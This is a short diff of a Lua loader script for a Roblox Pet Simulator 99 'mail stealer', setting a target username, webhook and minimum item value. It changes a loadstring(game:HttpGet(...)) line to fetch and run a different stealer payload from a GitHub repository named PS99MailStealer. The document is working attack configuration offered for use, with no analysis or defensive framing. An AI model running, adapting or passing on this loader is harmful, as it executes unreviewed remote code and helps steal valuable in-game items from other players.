@@ -1,7 +1,6 @@
-lua
 Username= 'Hunter4622'
 Webhook= 'N/A'
 
 MinimumRAP = 500000
 
-loadstring(game:HttpGet(https://raw.githubusercontent.com/Ps99scriptgiver-web/PS99MailStealer/main/OBSV2STEALER))()
+loadstring(game:HttpGet(https://raw.githubusercontent.com/Ps99scriptgiver-web/PS99MailStealer/main/EgoV2))()
